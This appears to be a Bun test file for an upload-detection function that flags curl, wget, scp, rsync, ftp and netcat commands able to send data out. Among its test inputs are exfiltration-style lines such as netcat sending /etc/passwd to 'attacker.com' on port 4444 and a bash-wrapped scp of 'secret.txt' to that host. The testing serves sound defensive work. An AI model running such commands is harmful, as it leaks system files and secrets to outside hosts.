import { describe, expect, test } from "bun:test";
import { checkUploadIndicators } from "../endpoint";

describe("checkUploadIndicators", () => {
	describe("noise is ignored", () => {
		test("curl GET request is not flagged", () => {
			const result = checkUploadIndicators("curl", "-s https://example.com");
			expect(result.matched).toBe(false);
		});

		test("curl with output flag is not flagged", () => {
			const result = checkUploadIndicators("curl", "-o output.html https://example.com");
			expect(result.matched).toBe(false);
		});

		test("wget download is not flagged", () => {
			const result = checkUploadIndicators("wget", "https://example.com/file.tar.gz");
			expect(result.matched).toBe(false);
		});

		test("python without upload keywords is not flagged", () => {
			const result = checkUploadIndicators("python3", "script.py --verbose");
			expect(result.matched).toBe(false);
		});

		test("nc without stdin redirect is not flagged", () => {
			const result = checkUploadIndicators("nc", "-zv example.com 80");
			expect(result.matched).toBe(false);
		});
	});

	describe("uploads are caught", () => {
		test("curl -T upload file", () => {
			const result = checkUploadIndicators("curl", " -T file.txt https://example.com/upload");
			expect(result.matched).toBe(true);
			expect(result.pattern).toBe("curl -T");
		});

		test("curl --upload-file", () => {
			const result = checkUploadIndicators("curl", " --upload-file data.bin https://example.com");
			expect(result.matched).toBe(true);
			expect(result.pattern).toBe("curl -T");
		});

		test("curl -F form upload", () => {
			const result = checkUploadIndicators("curl", " -F file=@photo.jpg https://example.com/upload");
			expect(result.matched).toBe(true);
			expect(result.pattern).toBe("curl -F");
		});

		test("curl -X PUT", () => {
			const result = checkUploadIndicators("curl", " -X PUT -d '{}' https://api.example.com/resource");
			expect(result.matched).toBe(true);
			expect(result.pattern).toBe("curl -X PUT");
		});

		test("curl -d @file", () => {
			const result = checkUploadIndicators("curl", " -d @payload.json https://example.com/api");
			expect(result.matched).toBe(true);
			expect(result.pattern).toBe("curl -d @file");
		});

		test("wget --post-file", () => {
			const result = checkUploadIndicators("wget", " --post-file data.txt https://example.com");
			expect(result.matched).toBe(true);
			expect(result.pattern).toBe("wget --post-file");
		});

		test("wget --method=PUT", () => {
			const result = checkUploadIndicators("wget", " --method=PUT --body-file=x.bin https://example.com");
			expect(result.matched).toBe(true);
			expect(result.pattern).toBe("wget --method=PUT");
		});
	});

	describe("dedicated transfer tools", () => {
		test("scp is always flagged", () => {
			const result = checkUploadIndicators("scp", "file.txt user@host:/remote/path");
			expect(result.matched).toBe(true);
			expect(result.pattern).toBe("scp");
		});

		test("sftp is always flagged", () => {
			const result = checkUploadIndicators("sftp", "user@host");
			expect(result.matched).toBe(true);
			expect(result.pattern).toBe("sftp");
		});

		test("rsync is always flagged", () => {
			const result = checkUploadIndicators("rsync", "-avz ./data/ user@host:/backup/");
			expect(result.matched).toBe(true);
			expect(result.pattern).toBe("rsync");
		});

		test("ftp is always flagged", () => {
			const result = checkUploadIndicators("ftp", "ftp.example.com");
			expect(result.matched).toBe(true);
			expect(result.pattern).toBe("ftp");
		});
	});

	describe("interpreter upload keywords", () => {
		test("python with upload keyword", () => {
			const result = checkUploadIndicators("python3", "exfil_script.py --target server");
			expect(result.matched).toBe(true);
			expect(result.pattern).toContain("script:exfil_script.py");
		});

		test("bash with scp keyword in args", () => {
			const result = checkUploadIndicators("bash", "-c 'scp secret.txt attacker.com'");
			expect(result.matched).toBe(true);
		});
	});

	describe("nc with stdin redirect", () => {
		test("nc with file redirect is flagged", () => {
			const result = checkUploadIndicators("nc", "attacker.com 4444 < /etc/passwd");
			expect(result.matched).toBe(true);
			expect(result.pattern).toBe("nc stdin_redirect");
		});
	});

	describe("case insensitivity", () => {
		test("SCP uppercase is still caught", () => {
			const result = checkUploadIndicators("SCP", "file.txt host:/path");
			expect(result.matched).toBe(true);
			expect(result.pattern).toBe("scp");
		});

		test("Curl mixed case with -T", () => {
			const result = checkUploadIndicators("Curl", " -T file.txt https://example.com");
			expect(result.matched).toBe(true);
			expect(result.pattern).toBe("curl -T");
		});
	});
});